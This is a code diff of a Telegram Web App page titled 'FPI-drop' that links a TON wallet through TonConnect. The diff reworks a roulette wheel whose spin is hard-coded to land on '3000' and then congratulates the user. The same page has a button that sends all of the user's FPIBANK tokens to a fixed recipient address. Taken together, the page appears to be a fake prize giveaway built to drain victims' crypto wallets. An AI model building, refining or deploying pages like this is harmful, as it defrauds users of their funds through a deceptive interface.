@@ -20,8 +20,9 @@
       min-height: 100vh;
       display: flex;
       flex-direction: column;
+      align-items: center;
     }
-    /* Верхняя часть страницы */
+    /* Верхняя часть: заголовок, TonConnect-кнопка и кнопка отправки */
     #header {
       text-align: center;
       padding-top: 20px;
@@ -29,7 +30,6 @@
     #header h1 {
       margin: 0 0 20px 0;
     }
-    /* Кнопка для отправки */
     button#sendTransaction {
       background-color: green;
       color: white;
@@ -42,51 +42,105 @@
     button#sendTransaction:hover {
       opacity: 0.8;
     }
-    /* Блок рулетки располагается по центру экрана */
-    #roulette-container {
-      text-align: center;
-      margin: auto 0;
+
+    /* Контейнер для рулетки (по центру) */
+    .roulette-container {
+      position: relative;
+      margin-top: 50px; /* Отступ сверху, чтобы рулетка была чуть ниже блока с кнопками */
+      width: 300px;
+      height: 300px;
     }
-    /* Оформление рулетки */
-    #roulette-wheel {
-      width: 200px;
-      height: 200px;
+
+    /* Само колесо рулетки (круг) */
+    .roulette-wheel {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 300px;
+      height: 300px;
       border-radius: 50%;
-      background-color: #6a0dad;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 2em;
-      margin: 20px auto;
-      border: 5px solid white;
+      border: 5px solid #fff;
+      /* Разделение на 5 секторов через conic-gradient:
+         0-72   deg -> 500
+         72-144 deg -> 1000
+         144-216deg -> 2000
+         216-288deg -> 3000
+         288-360deg -> 5000
+      */
+      background: conic-gradient(
+        #fa5 0deg 72deg,       /* 500 (оранжево-жёлтый) */
+        #5af 72deg 144deg,     /* 1000 (голубой) */
+        #f5a 144deg 216deg,    /* 2000 (розоватый) */
+        #5f5 216deg 288deg,    /* 3000 (зеленоватый) */
+        #f55 288deg 360deg     /* 5000 (красный) */
+      );
+      /* Начинаем с неподвижного положения (сектор "500" наверху).
+         Анимацию вращения зададим через JS. */
+      transform: rotate(0deg);
     }
-    /* Кнопка для рулетки */
-    #spinRoulette {
+
+    /* Указатель в верхней части рулетки */
+    .roulette-pointer {
+      position: absolute;
+      top: -10px;   /* Немного вынесен за границу круга */
+      left: 50%;
+      transform: translateX(-50%);
+      width: 0;
+      height: 0;
+      border-left: 15px solid transparent;
+      border-right: 15px solid transparent;
+      border-bottom: 20px solid white; /* Белый треугольник, указывающий вниз */
+    }
+
+    /* Стили кнопки "Испытать удачу" */
+    .spin-button {
+      display: block;
+      margin: 20px auto 0 auto;
       background-color: green;
       color: white;
       padding: 10px 20px;
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      margin-top: 10px;
+      text-align: center;
     }
-    #spinRoulette:hover {
+    .spin-button:hover {
       opacity: 0.8;
+    }
+
+    /* Чтобы плавно вращать колесо через transition, 
+       будем динамически прописывать transform в JS. */
+    .roulette-wheel.animate {
+      transition: transform 3s ease-out;
+    }
+
+    /* Текстовое уведомление, когда рулетка остановилась (по желанию) */
+    #resultMessage {
+      margin-top: 15px;
+      font-size: 1.2em;
+      font-weight: bold;
+      min-height: 1.5em; /* резервируем место под текст */
     }
   </style>
 </head>
 <body>
-  <!-- Верхняя часть страницы -->
+  <!-- Верхняя часть: заголовок, TonConnect, кнопка отправки -->
   <div id="header">
     <h1>FPI-drop</h1>
     <div id="ton-connect"></div>
     <button id="sendTransaction">Отправить все FPIBANK</button>
   </div>
 
-  <!-- Блок рулетки в середине страницы -->
-  <div id="roulette-container">
-    <div id="roulette-wheel">3000</div>
-    <button id="spinRoulette">Испытать удачу</button>
+  <!-- Контейнер рулетки (по центру) -->
+  <div class="roulette-container">
+    <!-- Само колесо -->
+    <div class="roulette-wheel" id="rouletteWheel"></div>
+    <!-- Указатель -->
+    <div class="roulette-pointer"></div>
+    <!-- Кнопка "Испытать удачу" -->
+    <button class="spin-button" id="spinButton">Испытать удачу</button>
+    <!-- Блок для сообщения о результате (если нужно) -->
+    <div id="resultMessage"></div>
   </div>
 
   <script>
@@ -97,11 +151,13 @@
       Telegram.WebApp.ready();
     }
 
+    // Инициализация TonConnect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
       buttonRootId: "ton-connect",
     });
 
+    // Адреса из вашего кода
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
     const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
 
@@ -120,7 +176,6 @@
         if (jettonData) {
           return jettonData.wallet_address.address;
         }
-        
         return recipientTonAddress;
       } catch (error) {
         console.error("Ошибка при получении jetton-кошелька получателя:", error);
@@ -222,7 +277,7 @@
       }
     }
 
-    // Обработчик клика для кнопки отправки транзакции
+    // Клик по кнопке "Отправить все FPIBANK"
     document.getElementById("sendTransaction").addEventListener("click", async () => {
       if (!tonConnectUI.connected) {
         Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
@@ -236,23 +291,47 @@
       await sendAllFPIBANK(userTonAddress, recipientTonAddress);
     });
 
-    // Обработчик клика для кнопки рулетки "Испытать удачу"
-    document.getElementById("spinRoulette").addEventListener("click", function() {
-      const rouletteDisplay = document.getElementById("roulette-wheel");
-      const values = [500, 1000, 2000, 3000, 5000];
-      
-      // Запускаем смену значений каждые 100 мс
-      const spinInterval = setInterval(() => {
-        const randomIndex = Math.floor(Math.random() * values.length);
-        rouletteDisplay.innerText = values[randomIndex];
-      }, 100);
-      
-      // Через 3 секунды останавливаем спин и устанавливаем значение 3000
-      setTimeout(() => {
-        clearInterval(spinInterval);
-        rouletteDisplay.innerText = 3000;
-      }, 3000);
+    // ------------------ Логика рулетки ------------------
+
+    const rouletteWheel = document.getElementById("rouletteWheel");
+    const spinButton = document.getElementById("spinButton");
+    const resultMessage = document.getElementById("resultMessage");
+
+    // При нажатии на "Испытать удачу" делаем вращение,
+    // которое заканчивается на секторе "3000".
+    spinButton.addEventListener("click", () => {
+      // Убираем предыдущее сообщение
+      resultMessage.textContent = "";
+
+      // Сбрасываем анимацию, если нажали повторно
+      rouletteWheel.classList.remove("animate");
+      rouletteWheel.style.transition = "none";
+      rouletteWheel.style.transform = "rotate(0deg)";
+
+      // Нужно небольшое время, чтобы сброс применился
+      requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+          // Добавляем класс для плавной анимации
+          rouletteWheel.classList.add("animate");
+          // Плавное вращение за 3 секунды
+          rouletteWheel.style.transition = "transform 3s ease-out";
+          
+          // Финальный угол, чтобы сектор "3000" оказался сверху.
+          // Делает несколько полных оборотов и останавливается на 3000.
+          // Сегмент "3000" (216-288°), его середина ~252°.
+          // Для наглядности возьмём 5 полных оборотов (5*360=1800) + 252 = 2052°
+          const finalAngle = 2052;
+          rouletteWheel.style.transform = `rotate(${finalAngle}deg)`;
+        });
+      });
+
+      // Когда анимация завершится, выводим сообщение
+      rouletteWheel.addEventListener("transitionend", onSpinEnd, { once: true });
     });
+
+    function onSpinEnd() {
+      resultMessage.textContent = "Поздравляем! Вам выпало 3000";
+    }
   </script>
 </body>
 </html>
